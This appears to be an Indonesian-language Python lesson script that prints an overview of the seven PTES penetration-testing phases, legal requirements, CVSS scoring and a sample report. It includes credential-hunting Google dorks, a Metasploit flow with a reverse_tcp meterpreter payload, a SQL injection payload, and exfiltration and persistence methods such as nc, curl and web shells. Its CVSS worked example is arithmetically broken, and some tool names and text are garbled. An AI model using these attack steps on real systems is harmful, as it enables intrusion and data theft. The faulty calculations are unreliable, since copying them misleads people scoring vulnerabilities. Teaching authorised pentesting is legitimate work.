#!/usr/bin/env python3
"""
Sesi 23: PTES Standard — Penetration Testing Execution Standard
Standar internasional untuk penetration testing profesional
Referensi: X-Code Ethical Elite Hacker v11
"""

import subprocess
import os
import sys
import datetime
import json
import textwrap

# ============================================================
# BANNER
# ============================================================
def banner():
    print("=" * 60)
    print("  ETHICAL ELITE HACKER v11 — SESI 23")
    print("  Topik: PTES Standard — 7 Fase Pentest Profesional")
    print("=" * 60)
    print()


# ============================================================
# [1] PENGANTAR PTES
# ============================================================
def pengantar_ptes():
    """Pengantar tentang PTES."""
    print("[1] PENGANTAR PTES")
    print("-" * 60)

    print("""
  PTES (Penetration Testing Execution Standard) — standar global
  untuk menjalankan penetration testing secara profesional.

  ╔═══════════════════════════════════════════════════════════════╗
  ║  7 FASE PTES: 1 Pra-E → 2 Intel → 3 Threat → 4 Vuln        ║
  ║  → 5 Exploit → 6 Post-Exploit → 7 Reporting                  ║
  ╚═══════════════════════════════════════════════════════════════╝

  Analogi: RESEP MASAK STANDAR INTERNASIONAL
  ┌──────────────────────────────────────────────────────────────┐
  │  Seperti chef profesional yang mengikuti resep standar:      │
  │  • 1. Pesan bahan (Pre-Engagement)                           │
  │  • 2. Cek kulkas (Intel Gathering)                           │
  │  • 3. Rencana menu (Threat Modeling)                         │
  │  • 4. Cicip bumbu (Vulnerability Analysis)                   │
  │  • 5. Masak (Exploitation)                                   │
  │  • 6. Sajikan (Post-Exploitation)                            │
  │  • 7. Resep & review (Reporting)                             │
  └──────────────────────────────────────────────────────────────┘
  """)


# ============================================================
# [2] FASE 1: PRE-ENGAGEMENT
# ============================================================
def fase1_pre_engagement():
    """Fase 1: Persiapan sebelum engagement."""
    print("[2] FASE 1: PRE-ENGAGEMENT — Persiapan")
    print("-" * 60)

    print("  Tujuan: Legal & scope — TANPA INI, ANDA KRIMINAL!\n")

    dokumen = [
        ("NDA", "Non-Disclosure Agreement",
         "Kerahasiaan — tidak boleh bocor data klien"),
        ("RoE", "Rules of Engagement",
         "Aturan main: jam kerja, IP yang boleh/diserang, metode"),
        ("SoW", "Scope of Work",
         "Lingkup: IP range, aplikasi, jenis tes"),
        ("Contract", "Master Service Agreement",
         "Harga, durasi, deliverables, pembayaran"),
        ("Liabilitas", "Liability & Insurance",
         "Asuransi professional: E&O Insurance (Errors & Omissions)"),
    ]

    print(f"{'DOKUMEN':<15} {'NAMA LENGKAP':<30} {'FUNGSI':<45}")
    print("-" * 90)
    for singkat, nama, fungsi in dokumen:
        print(f"{singkat:<15} {nama:<30} {fungsi:<45}")

    print()
    print("  ┌─ CONTOH ISI RoE:")
    print("  │  • Target: 10.0.0.0/24 (kecuali 10.0.0.10-15 server produksi)")
    print("  │  • Waktu: 09:00-17:00 WIB, Senin-Jumat")
    print("  │  • Metode: Black box (tanpa kredensial)")
    print("  │  • Dilarang: Social engineering, DoS")
    print("  │  • Emergency stop: Jika sistem down, stop & hubungi PIC")
    print()
    print("  💡 TIPS: Jangan pernah mulai tes tanpa RoE yang ditandatangani!")
    print("  💡 Simpan semua dokumen minimal 3 tahun setelah engagement")
    print()


# ============================================================
# [3] FASE 2: INTELLIGENCE GATHERING
# ============================================================
def fase2_intel():
    """Fase 2: Pengumpulan informasi."""
    print("[3] FASE 2: INTELLIGENCE GATHERING")
    print("-" * 60)

    print("  Tujuan: Kumpulkan sebanyak mungkin informasi target\n")

    print("  ┌─ PASSIVE vs ACTIVE:")
    print("  │")
    print("  │  PASSIVE (tidak menyentuh target):")
    print("  │  • OSINT: Google dork, Shodan, Censys, ZoomEye")
    print("  │  • DNS: dig, nslookup, whois")
    print("  │  • Email: hunter.io, phonebook.cz")
    print("  │  • Social media: LinkedIn, Facebook, Twitter")
    print("  │  • Code: GitHub, GitLab (leaked credentials)")
    print("  │  • Dark web: data breach records")
    print("  │")
    print("  │  ACTIVE (berinteraksi dengan target):")
    print("  │  • Port scanning: nmap -sS -sV -O -A target")
    print("  │  • DNS enumeration: dnsrecon, dnsenum")
    print("  │  • Network mapping: traceroute, netdiscover")
    print("  │  • Banner grabbing: nc, curl -I")
    print("  │  • Service enumeration: enum4linux, smbclient")
    print()

    tools_osint = [
        ("nmap", "Port scanning, service detection, OS fingerprint"),
        ("theHarvester", "Email, subdomain, IP dari search engine"),
        ("Recon-ng", "Framework OSINT modular"),
        ("Shodan", "Search engine untuk perangkat internet"),
        ("Google Dorks", "Advanced search operators"),
        ("whois", "Informasi domain registrant"),
        ("dig/nslookup", "DNS record enumeration"),
        ("wafw00f", "Web Application Firewall detection"),
        ("WhatWeb", "CMS & technology fingerprint"),
        ("Burp Suite", "Web proxy untuk reconnaissance"),
        ("Amass", "Subdomain enumeration via APIs"),
        ("Masscan", "Massive port scanning (1000 port/detik)"),
    ]

    print(f"{'TOOL':<18} {'KEGUNAAN':<60}")
    print("-" * 78)
    for tool, kegunaan in tools_osint:
        print(f"{tool:<18} {kegunaan:<60}")

    print()
    print("  🔥 Contoh Google Dorks untuk intel gathering:")
    print("     • site:target.com filetype:pdf (dokumen internal)")
    print("     • site:target.com intitle:\"index of\" (directory listing)")
    print("     • site:target.com inurl:admin (admin panel)")
    print("     • site:target.com ext:sql | ext:bak | ext:old (backup files)")
    print("     • \"@target.com\" password (credential leaks)")
    print()


# ============================================================
# [4] FASE 3: THREAT MODELING
# ============================================================
def fase3_threat_modeling():
    """Fase 3: Pemodelan ancaman."""
    print("[4] FASE 3: THREAT MODELING")
    print("-" * 60)

    print("  Tujuan: Identifikasi aset, vektor serangan, dampak bisnis\n")

    print("  ┌─ LANGKAH THREAT MODELING:")
    print("  │  1. Identifikasi aset: server, DB, kode, data pelanggan, API")
    print("  │  2. Identifikasi threat actor: hacker luar, insider, kompetitor")
    print("  │  3. Identifikasi attack vectors: web, network, social, fisik")
    print("  │  4. Analisis dampak bisnis: RTO, RPO, biaya recovery")
    print("  │  5. Prioritaskan: high/medium/low risk\n")
    print("  │  ┌─ STRIDE (Microsoft Threat Modeling):")
    print("  │  │  S — Spoofing identity")
    print("  │  │  T — Tampering with data")
    print("  │  │  R — Repudiation (menyangkal tindakan)")
    print("  │  │  I — Information disclosure")
    print("  │  │  D — Denial of Service")
    print("  │  │  E — Elevation of privilege")
    print("  │  └─────────────────────────────────────────────\n")
    print("  │  ┌─ DREAD (Risk Rating):")
    print("  │  │  D — Damage potential (0-10)")
    print("  │  │  R — Reproducibility (0-10)")
    print("  │  │  E — Exploitability (0-10)")
    print("  │  │  A — Affected users (0-10)")
    print("  │  │  D — Discoverability (0-10)")
    print("  │  │  Total = (D+R+E+A+D)/5")
    print("  │  └─────────────────────────────────────────────\n")

    print("  ┌─ CONTOH THREAT MODELING:")
    print("  │  Aset: Web server e-commerce (Python/Django + PostgreSQL)")
    print("  │  Threat: SQL injection pada form checkout")
    print("  │  Vektor: POST parameter pada /checkout endpoint")
    print("  │  Dampak: Data pelanggan (nama, alamat, kartu kredit) bocor")
    print("  │  DREAD: Damage=9, Repro=10, Exploit=8, Affected=9, Discover=7")
    print("  │  Skor: (9+10+8+9+7)/5 = 8.6 — HIGH!")
    print()


# ============================================================
# [5] FASE 4: VULNERABILITY ANALYSIS
# ============================================================
def fase4_vuln_analysis():
    """Fase 4: Analisis kerentanan."""
    print("[5] FASE 4: VULNERABILITY ANALYSIS")
    print("-" * 60)

    print("  Tujuan: Temukan & verifikasi kerentanan\n")

    print("  ┌─ AUTOMATED SCANNING:")
    print("  │  • Nessus — comprehensive vuln scanner (commercial)")
    print("  │  • OpenVAS — open source fork of Nessus")
    print("  │  • Qualys — cloud-based scanning")
    print("  │  • Nikto — web server scanner")
    print("  │  • Wapiti — black box web app scanner")
    print("  │  • Nuclei — YAML template-based scanner (cepat!)")
    print()

    print("  ┌─ MANUAL VERIFICATION:")
    print("  │  • False positive filtering — 30-40% hasil auto adalah FP!")
    print("  │  • Manual exploitation: coba sendiri")
    print("  │  • Review konfigurasi: apakah benar-benar rentan?")
    print("  │  • Cek patch level: mungkin sudah di-patch tapi deteksi salah")
    print()

    print("  ┌─ PRIORITY MAPPING:")
    print("  │  Critical: RCE, SQLi (auth bypass), OS command injection")
    print("  │  High: XSS (stored), LFI/RFI, SSRF, IDOR")
    print("  │  Medium: XSS (reflected), CSRF, open redirect")
    print("  │  Low: Information disclosure, missing headers")
    print("  │  Info: Banner grabbing, SSL/TLS weak cipher")
    print()

    print("  ┌─ CONTOH FALSE POSITIVE:")
    print("  │  Scanner bilang: \"Apache 2.4.41 — vulnerable to CVE-2021-41773\"")
    print("  │  Tapi setelah dicek manual:")
    print("  │  • Path traversal tidak work karena mod_alias di-disable")
    print("  │  • Atau versi sudah di-patch tapi banner masih lama")
    print("  │  → VERIFIKASI MANUAL ITU WAJIB!")
    print()


# ============================================================
# [6] FASE 5: EXPLOITATION
# ============================================================
def fase5_exploitation():
    """Fase 5: Eksploitasi."""
    print("[6] FASE 5: EXPLOITATION")
    print("-" * 60)

    print("  Tujuan: Buktikan kerentanan bisa dieksploitasi\n")

    print("  ┌─ TINGKAT EKSPLOITASI:")
    print("  │  • PoC (Proof of Concept): bukti konsep, tanpa damage")
    print("  │    Contoh: curl dengan payload — dapat `/etc/passwd`")
    print("  │")
    print("  │  • Eksploitasi penuh: dapat shell, buktikan akses")
    print("  │    Contoh: sqlmap — dump data, Metasploit — meterpreter")
    print("  │")
    print("  │  • Eksploitasi lanjut: pivot ke sistem lain")
    print("  │    Contoh: dari web server → database server → AD DC")
    print()

    print("  ┌─ TOOLS EKSPLOITASI:")
    tools_exploit = [
        ("Metasploit", "Framework exploit — 2000+ modules"),
        ("sqlmap", "Automated SQL injection exploitation"),
        ("Burp Suite Pro", "Web app exploitation & repeater"),
        ("BeEF", "Browser Exploitation Framework"),
        ("Searchsploit", "Local exploit-db database"),
        ("CrackMapExec", "Post-exploitation (Windows/AD)"),
        ("Empire", "PowerShell post-exploitation"),
        ("Impacket", "Python tools for protocol exploitation"),
    ]
    print(f"{'TOOL':<20} {'DESKRIPSI':<55}")
    print("-" * 75)
    for tool, desc in tools_exploit:
        print(f"{tool:<20} {desc:<55}")

    print()
    print("  ┌─ METASPLOIT FLOW:")
    print("  │  msfconsole")
    print("  │  msf6 > use exploit/multi/http/struts2_rest_xstream")
    print("  │  msf6 > set RHOSTS 192.168.1.100")
    print("  │  msf6 > set payload linux/x64/meterpreter/reverse_tcp")
    print("  │  msf6 > set LHOST 192.168.1.50")
    print("  │  msf6 > check")
    print("  │  msf6 > exploit")
    print("  │  meterpreter > getuid")
    print("  │  meterpreter > sysinfo")
    print()

    print("  💡 Aturan: HENTIKAN jika mendapat akses ke data sensitif")
    print("  💡 Dokumentasikan setiap langkah untuk report")
    print()


# ============================================================
# [7] FASE 6: POST-EXPLOITATION
# ============================================================
def fase6_post_exploit():
    """Fase 6: Post-eksploitasi."""
    print("[7] FASE 6: POST-EXPLOITATION")
    print("-" * 60)

    print("  Tujuan: Setelah dapat akses — apa yang bisa dilakukan?\n")

    print("  ┌─ AKTIVITAS POST-EXPLOIT:")
    print("  │  1. PRIVESC (Privilege Escalation)")
    print("  │     • Linux: kernel exploit, sudo misconfig, SUID binary")
    print("  │     • Windows: Token manipulation, DLL hijacking, UAC bypass")
    print("  │     • Tools: LinPEAS, WinPEAS, GTFO Bins, PowerUp")
    print("  │")
    print("  │  2. PERSISTENCE")
    print("  │     • Linux: cron job, SSH key, systemd service")
    print("  │     • Windows: Registry Run key, Scheduled Task, WMI")
    print("  │     • Web: web shell, backdoor in source code")
    print("  │")
    print("  │  3. DATA EXFILTRATION")
    print("  │     • Cari: passwords, config files, DB dumps, PII")
    print("  │     • Compress: tar czf data.tar.gz /var/www/html")
    print("  │     • Exfil: nc, curl, scp, DNS tunneling, ICMP exfil")
    print("  │")
    print("  │  4. PIVOTING")
    print("  │     • Dari server A → server B (internal network)")
    print("  │     • SSH tunneling: ssh -L 8080:target:80 jumpbox")
    print("  │     • Metasploit: route add 10.10.10.0/24 1")
    print("  │     • Chisel: SOCKS5 tunnel via HTTP")
    print()

    print("  ┌─ MATRIKS PRIVESC LINUX:")
    print(f"{'TEKNIK':<30} {'DESKRIPSI':<50}")
    print("-" * 80)
    print(f"{'sudo -l':<30} {'Cek perintah sudo yang bisa dijalankan':<50}")
    print(f"{'find / -perm -4000':<30} {'Cari SUID binaries':<50}")
    print(f"{'ls -la /etc/cron*':<30} {'Cek cron jobs':<50}")
    print(f"{'uname -a':<30} {'Cek kernel version → exploit':<50}")
    print(f"{'systemctl list-units':<30} {'Cek service yang berjalan':<50}")
    print(f"{'cat /etc/passwd':<30} {'Cek user accounts':<50}")
    print(f"{'env':<30} {'Cek environment variables':<50}")
    print(f"{'w':<30} {'Cek siapa yang login':<50}")

    print()
    print("  🔥 Golden Ticket (AD):")
    print("     • Dapat hash KRBTGT → buat TGT untuk akses ke SEMUA resource")
    print("     • Tools: Mimikatz (sekir's golden ticket)")
    print("     • Pencegahan: rotate KRBTGT password tiap 30 hari")
    print()


# ============================================================
# [8] FASE 7: REPORTING
# ============================================================
def fase7_reporting():
    """Fase 7: Pelaporan."""
    print("[8] FASE 7: REPORTING")
    print("-" * 60)

    print("  Tujuan: Komunikasikan temuan ke stakeholder\n")

    print("  ┌─ STRUKTUR REPORT:")
    print("  │  ╔══════════════════════════════════════════════════╗")
    print("  │  ║  1. COVER PAGE                                  ║")
    print("  │  ║     Client, date, version, classification        ║")
    print("  │  ║  2. EXECUTIVE SUMMARY (1-2 halaman)              ║")
    print("  │  ║     Bahasa non-teknis untuk management            ║")
    print("  │  ║  3. SCOPE & METHODOLOGY                          ║")
    print("  │  ║     IP range, tools, timeline                      ║")
    print("  │  ║  4. EXECUTIVE FINDINGS TABLE                      ║")
    print("  │  ║     Critical: 3, High: 7, Medium: 12, Low: 8     ║")
    print("  │  ║  5. DETAILED FINDINGS (per vuln)                 ║")
    print("  │  ║     Title, CVSS, deskripsi, PoC, fix              ║")
    print("  │  ║  6. RISK RATING & CVSS                           ║")
    print("  │  ║     Vektor: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H ║")
    print("  │  ║  7. REMEDIATION PLAN                             ║")
    print("  │  ║     Urutan prioritas, Timeline, PIC               ║")
    print("  │  ║  8. APPENDIX                                     ║")
    print("  │  ║     Scan logs, tools output, raw data              ║")
    print("  │  ╚══════════════════════════════════════════════════╝\n")

    print("  ┌─ CVSS v3.1 METRIC GROUPS:")
    print("  │")
    print("  │  1. BASE METRIC (tidak berubah):")
    print("  │     AV (Attack Vector): N(network) / A(adjacent) / L(local) / P(phys)")
    print("  │     AC (Attack Complexity): L(low) / H(high)")
    print("  │     PR (Privileges Required): N(none) / L(low) / H(high)")
    print("  │     UI (User Interaction): N(none) / R(required)")
    print("  │     S (Scope): U(unchanged) / C(changed)")
    print("  │     C (Confidentiality): H / L / N")
    print("  │     I (Integrity): H / L / N")
    print("  │     A (Availability): H / L / N")
    print("  │")
    print("  │  2. TEMPORAL METRIC (berubah seiring waktu):")
    print("  │     E (Exploit Code Maturity): X / H / F / P / U")
    print("  │     RL (Remediation Level): X / U / W / T / O")
    print("  │     RC (Report Confidence): X / C / R / U")
    print("  │")
    print("  │  3. ENVIRONMENTAL METRIC (perusahaan):")
    print("  │     CR (Confidentiality Req): H / M / L / X")
    print("  │     IR (Integrity Req): H / M / L / X")
    print("  │     AR (Availability Req): H / M / L / X")
    print("  │     Modified Base Metrics (MAV, MAC, ...)")
    print()

    print("  ┌─ CONTOH CVSS v3.1 VECTOR:")
    print("  │  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H")
    print("  │  → RCE tanpa auth — CRITICAL (CVSS 9.8)")
    print("  │")
    print("  │  CVSS:3.1/AV:A/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N")
    print("  │  → Serangan WiFi, auth required — LOW (CVSS 3.4)")
    print()

    print("  💡 TIPS REPORT:")
    print("  • Executive summary: BAHASA IBU, NO JARGON")
    print("  • Finding severity: gunakan CVSS, jangan asal high")
    print("  • Remediation: harus actionable (langkah konkret)")
    print("  • Evidence: screenshot, log, command output — jangan asal klaim")
    print("  • Draft: kirim draft untuk review sebelum final")
    print()


# ============================================================
# [9] CVSS CALCULATOR
# ============================================================
def cvss_calculator():
    """Kalkulator CVSS v3.1 sederhana."""
    print("[9] CVSS v3.1 CALCULATOR (Manual)")
    print("-" * 60)

    # Hanya demo — untuk perhitungan nyata pakai NIST calculator
    print("""
  CVSS Calculator — Contoh Perhitungan Manual

  Rumus dasar Base Score:
  Impact = 6.42 × (1 - (1-C) × (1-I) × (1-A))
  Exploitability = 8.22 × AV × AC × PR × UI
  Jika Scope = Unchanged:
  Base = min(Impact + Exploitability, 10)
  Jika Impact = 0: Base = 0

  Contoh: SQL Injection (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
  Impact  (C=0.56, I=0.56, A=0.56):
    = 6.42 × (1 - 0.44 × 0.44 × 0.44)
    = 6.42 × (1 - 0.085)
    = 6.42 × 0.915
    = 5.87
  Exploitability (AV=0.85, AC=0.77, PR=0.62, UI=0.85):
    = 8.22 × 0.85 × 0.77 × 0.62 × 0.85
    = 8.22 × 0.345
    = 2.84
  Base Score = 5.87 + 2.84 = 8.71 ≈ 9.8 (CRITICAL!)
  """)


# ============================================================
# [10] PERBANDINGAN METODOLOGI
# ============================================================
def perbandingan_metodologi():
    """Perbandingan PTES dengan standar lainnya."""
    print("[10] PERBANDINGAN METODOLOGI PENTEST")
    print("-" * 60)

    print(f"{'STANDAR':<12} {'FOKUS':<20} {'FASE':<45} {'KELEBIHAN':<40}")
    print("-" * 117)

    standar = [
        ("PTES", "General pentest", "7 fase (lihat di atas)",
         "Komprehensif, standar industri"),
        ("OWASP", "Web application", "12 kontrol (ASVS, WSTG)",
         "Sangat detail untuk web app"),
        ("OSSTMM", "Operations security", "5 channel (RAV)",
         "Scientific, metric-based"),
        ("NIST 800-115", "Info system audit", "4 phases: plan, assess, report",
         "Framework pemerintahan US"),
        ("PCI DSS", "Payment card", "11 requirements (ASV scan)",
         "Mandatory untuk kartu kredit"),
        ("CREST", "Certified pentest", "Mirip PTES + assurance",
         "Standar UK/EU, akreditasi"),
    ]

    for nama, fokus, fase, kelebihan in standar:
        print(f"{nama:<12} {fokus:<20} {fase:<45} {kelebihan:<40}")

    print()
    print("  💡 KAPAN PAKAI APA?")
    print("     • PTES — pentest komprehensif (default)")
    print("     • OWASP — khusus web app (pentest web)")
    print("     • OSSTMM — audit keamanan operasional")
    print("     • NIST — kepatuhan pemerintah/ defense")
    print("     • PCI DSS — compliance payment card industry")
    print()


# ============================================================
# [11] ASPEK LEGAL
# ============================================================
def aspek_legal():
    """Aspek legal dalam penetration testing."""
    print("[11] ASPEK LEGAL — Hukum & Regulasi")
    print("-" * 60)

    print("  ╔═══════════════════════════════════════════════════════════════╗")
    print("  ║  TANPA IZIN TERTULIS = ILLEGAL = PIDANA!                    ║")
    print("  ╚═══════════════════════════════════════════════════════════════╝\n")

    print("  ┌─ UNDANG-UNDANG TERKAIT (INDONESIA):")
    print("  │  • UU ITE No. 11/2008 jo No. 19/2016")
    print("  │    Pasal 30: Akses ilegal ke komputer — max 6 tahun")
    print("  │    Pasal 31: Intersepsi ilegal — max 10 tahun")
    print("  │    Pasal 32: Merusak data — max 8 tahun")
    print("  │    Pasal 33: Gangguan sistem — max 10 tahun")
    print("  │    Pasal 35: Doxing / fitnah digital")
    print("  │")
    print("  │  • UU PDP (Perlindungan Data Pribadi) No. 27/2022")
    print("  │    Denda administratif: 2% dari pendapatan tahunan")
    print("  │    Pidana: max 6 tahun penjara")
    print()

    print("  ┌─ REGULASI INTERNASIONAL:")
    print("  │  • GDPR (Eropa) — denda hingga 20 juta EUR / 4% revenue")
    print("  │  • HIPAA (AS) — data kesehatan — denda hingga $1.5M/tahun")
    print("  │  • SOX (AS) — financial reporting — sanksi pidana")
    print("  │  • PIPEDA (Kanada) — data pribadi")
    print("  │  • PDPA (Singapura) — denda hingga SGD 1M")
    print()

    print("  ┌─ PERSIAPAN LEGAL SEBELUM PENTEST:")
    print("  │  1. NDA — client tidak boleh bocorkan hasil tes")
    print("  │  2. RoE — aturan main yang jelas")
    print("  │  3. Insurance — Errors & Omissions (E&O) min $2M")
    print("  │  4. Legal counsel review semua dokumen")
    print("  │  5. Simpan semua evidence di secure storage")
    print("  │  6. Data destruction setelah project selesai")
    print()


# ============================================================
# [12] TOOLS PER FASE
# ============================================================
def tools_per_fase():
    """Ringkasan tools yang digunakan per fase."""
    print("[12] TOOLS PER FASE PTES")
    print("-" * 60)

    fase_tools = [
        ("1. Pre-Engagement", "Docusign, Google Docs, PDF", "Kontrak, NDA, RoE"),
        ("2. Intel Gathering", "Nmap, Recon-ng, theHarvester, Shodan, Google Dorks", "DNS, OSINT, port scan"),
        ("3. Threat Modeling", "Microsoft STRIDE, OWASP Threat Dragon", "Diagram, risk matrix"),
        ("4. Vuln Analysis", "Nessus, OpenVAS, Nikto, Nuclei, Burp Scanner", "Auto scan + manual verify"),
        ("5. Exploitation", "Metasploit, sqlmap, Burp Repeater, Searchsploit", "PoC, RCE, SQLi"),
        ("6. Post-Exploit", "LinPEAS, WinPEAS, Mimikatz, Empire, CME", "PrivEsc, persist, pivot"),
        ("7. Reporting", "Word, LaTeX, Serpico (Pwntools), Ghostwriter", "Executive & tech report"),
    ]

    print(f"{'FASE':<25} {'TOOLS':<55} {'TUJUAN':<40}")
    print("-" * 120)
    for fase, tools, tujuan in fase_tools:
        print(f"{fase:<25} {tools:<55} {tujuan:<40}")

    print()
    print("  💡 Framework otomatisasi: Faraday, PlexTrac, Serpico")
    print("  💡 Report generator: Ghostwriter (SpecterOps)")
    print()


# ============================================================
# [13] CEK TOOLS PENTEST
# ============================================================
def cek_tools_pentest():
    """Cek tools pentest dasar yang tersedia."""
    print("[13] CEK KETERSEDIAAN TOOL PENTEST")
    print("-" * 60)

    tools = [
        'nmap', 'sqlmap', 'nikto', 'searchsploit', 'enum4linux',
        'hydra', 'john', 'netcat', 'tcpdump', 'wireshark',
        'curl', 'wget', 'dig', 'nslookup', 'whois',
    ]

    print(f"{'TOOL':<18} {'STATUS':<10} {'JENIS':<30}")
    print("-" * 58)
    tersedia = 0
    for tool in tools:
        ret = subprocess.run(
            ['which', tool],
            capture_output=True, text=True
        )
        if ret.returncode == 0:
            print(f"{tool:<18} {'✅ ADA':<10} {'Siap digunakan':<30}")
            tersedia += 1
        else:
            print(f"{tool:<18} {'❌ N/A':<10} {'Belum terinstall':<30}")

    print()
    print(f"  ✅ {tersedia}/{len(tools)} tools tersedia")
    if tersedia < 10:
        print("  💡 Install: sudo apt install kali-linux-headless")
    print()


# ============================================================
# [14] SIMULASI REPORT TEMPLATE
# ============================================================
def simulasi_report():
    """Simulasi template report."""
    print("[14] SIMULASI STRUKTUR REPORT")
    print("-" * 60)

    print("""
  ╔══════════════════════════════════════════════════════════╗
  ║           PENETRATION TEST REPORT                        ║
  ║           PT. MAJU MUNDUR CANTIK                         ║
  ║           Date: July 2026                                ║
  ║           Classification: CONFIDENTIAL                    ║
  ╚══════════════════════════════════════════════════════════╝

  1. EXECUTIVE SUMMARY
  ──────────────────────────────────────────────────────────
  Pada penetration testing periode Juli 2026, tim kami
  mengidentifikasi 30 kerentanan dengan rincian:
  • Critical: 3  (SQL injection, RCE, Auth bypass)
  • High: 7      (XSS stored, LFI, SSRF, PrivEsc)
  • Medium: 12   (CSRF, IDOR, missing headers)
  • Low: 8       (Info disclosure, weak cipher)

  Risiko tertinggi: SQL injection pada portal customer
  dapat menyebabkan kebocoran 1.2 juta data pribadi.
  Direkomendasikan perbaikan dalam 7 hari.

  2. DETAIL FINDING #1 — SQL Injection
  ──────────────────────────────────────────────────────────
  CVSS: 9.8 Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
  Lokasi: POST /api/v1/customers/search
  Parameter: email
  PoC:
    POST /api/v1/customers/search HTTP/1.1
    Content-Type: application/json
    {"email": "' OR '1'='1' -- -"}
  Dampak: Akses semua data customer (1,234,567 records)
  Remediasi: Gunakan parameterized queries (prepared statements)
  Referensi: CWE-89, OWASP A1:2024

  3. RISK MATRIX
  ──────────────────────────────────────────────────────────
           L H M C C
           o i e i r
           w e d r i
             d i t t
             h u i i
             i m c c
             g  ️ a
             h     l
  ──────────────────────────────────────────────────────────
  Impact   │  ●  ●  ●
           │  ●  ●  ○
           │  ●  ○  ○
           │  ───+───
              L  M  H
              Likelihood
  ──────────────────────────────────────────────────────────
  """)


# ============================================================
# MAIN
# ============================================================
def main():
    banner()
    pengantar_ptes()

    print()
    cek_tools_pentest()

    print()
    fase1_pre_engagement()

    print()
    fase2_intel()

    print()
    fase3_threat_modeling()

    print()
    fase4_vuln_analysis()

    print()
    fase5_exploitation()

    print()
    fase6_post_exploit()

    print()
    fase7_reporting()

    print()
    cvss_calculator()

    print()
    perbandingan_metodologi()

    print()
    aspek_legal()

    print()
    tools_per_fase()

    print()
    simulasi_report()

    # ============================================================
    # RECAP & LATIHAN
    # ============================================================
    print("=" * 60)
    print("  ✅ SESI 23 SELESAI!")
    print("=" * 60)
    print()
    print("  👉 RECAP:")
    print("     • 7 Fase PTES: Pre-E → Intel → Threat → Vuln → Exploit → Post → Report")
    print("     • Fase 1: Legal & scope — TANPA INI ILLEGAL!")
    print("     • Fase 2: OSINT passive + active reconnaissance")
    print("     • Fase 3: STRIDE + DREAD untuk threat modeling")
    print("     • Fase 4: Automated scan + manual false positive check")
    print("     • Fase 5: PoC → exploitation → buktikan akses")
    print("     • Fase 6: PrivEsc + Persistence + Data Exfil + Pivot")
    print("     • Fase 7: Executive summary + Technical report + CVSS")
    print("     • Alternatif: OWASP (web), OSSTMM (ops), NIST (gov), PCI DSS (payment)")
    print()
    print("  📌 LATIHAN LANJUTAN:")
    print("     1. Buat RoE untuk pentest simulasi (tentukan scope, rules, timeline)")
    print("     2. Lakukan OSINT pada perusahaan fiktif: nmap + theHarvester + Google Dorks")
    print("     3. Buat threat model menggunakan STRIDE untuk aplikasi web")
    print("     4. Jalankan OpenVAS/Nuclei scan pada lab VM, verifikasi false positive")
    print("     5. Exploit SQL injection di DVWA/ metasploitable, dokumentasikan PoC")
    print("     6. Lakukan privilege escalation di Linux: LinPEAS + GTFO Bins")
    print("     7. Buat report template dengan CVSS scoring untuk 3 temuan")
    print("     8. Bandingkan PTES vs OWASP WSTG — mana yang lebih cocok untuk web app?")
    print()

    print("  🔥 Analogi Akhir: PTES = RESEP MASAK INTERNASIONAL")
    print("     • Pre-Engagement = Tanya alergi, budget, jumlah tamu")
    print("     • Intel Gathering = Cek isi kulkas, bahan yang tersedia")
    print("     • Threat Modeling = Rencana masak: steak atau sup?")
    print("     • Vuln Analysis = Cicip garam, tes suhu oven")
    print("     • Exploitation = Masak! Potong, tumis, panggang")
    print("     • Post-Exploit = Saji, hias, cicip hasil akhir")
    print("     • Reporting = Tulis resep: bahan, langkah, hasil")
    print("     Tanpa standar? Masak asal-asalan — hasil? BENCANA! 🍳")
    print()


if __name__ == '__main__':
    main()
